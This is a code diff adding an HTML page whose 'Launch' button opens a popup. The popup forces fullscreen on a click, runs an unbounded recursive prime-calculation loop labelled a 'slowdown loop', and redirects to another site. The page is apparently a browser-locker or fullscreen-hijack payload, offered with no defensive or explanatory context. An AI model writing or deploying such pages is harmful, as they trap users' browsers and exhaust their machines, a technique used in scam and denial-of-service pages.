@@ -1,0 +1,46 @@
+<script>
+function launch() {
+    var newWindow = window.open("", "", "newWindow")
+
+    newWindow.document.write(`<html onmousedown="run();run();">
+    <script>
+
+    function run() {
+
+    document.documentElement.requestFullscreen()
+
+    // slowdown loop
+    setTimeout(function() { calculatePrimes(1001, 10000) },1)
+
+    location.href = "https://www.example.com"
+
+    }
+
+    function calculatePrimes(iterations, multiplier) {
+        var primes = [];
+        for (var i = 0; i < iterations; i++) {
+            var candidate = i * (multiplier * Math.random());
+            var isPrime = true;
+            for (var c = 2; c <= Math.sqrt(candidate); ++c) {
+                if (candidate % c === 0) {
+                    // not prime
+                    isPrime = false;
+                    break;
+                }
+            }
+            if (isPrime) {
+                primes.push(candidate);
+            }
+        }
+        // calculate primes loop
+        calculatePrimes(iterations, multiplier)
+    }
+    <\/script>
+
+    <h2>Click anywhere on the page</h2>
+
+    </html>`)
+}
+</script>
+
+<button onclick="launch()">Launch</button>
